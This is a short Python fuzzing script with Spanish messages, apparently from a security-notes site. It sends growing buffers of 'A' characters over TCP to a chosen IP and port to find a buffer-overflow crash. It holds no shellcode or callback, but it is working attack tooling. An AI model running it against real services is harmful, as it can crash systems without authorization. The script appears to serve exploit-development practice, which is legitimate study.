#!/usr/bin/python3
#Johnny Chafla | @jch | @hacknotes
#site https://hacknotes.github.io/

import socket, signal, sys, time
from pwn import *

def def_handler(sig, frame):
	print ("\n\n[!]Saliendo...!!\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if len (sys.argv) < 3:
	print ("\n\n[!] Uso: pyhton3" + sys.argv[0] + "<ip> <port>\n")
	sys.exit(1)

ipAdd = sys.argv[1]
port = sys.argv[2]

if __name__=='__main__':

	buffer = ["A"]
	counter = 30

	while len(buffer) < 32:
		buffer.append("A"*counter)
		counter += 30

	p1 = log.progress("Enviando Payloads")

	for string in buffer:
	 p1.status("%s bytes" % len(string))
	 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	 s.connect((ipAdd, int(port)))
	 payload = bytes (string + '\r\n', "ascii")
	 s.send(payload)
	 data = s.recv(1024)

sleep(2)
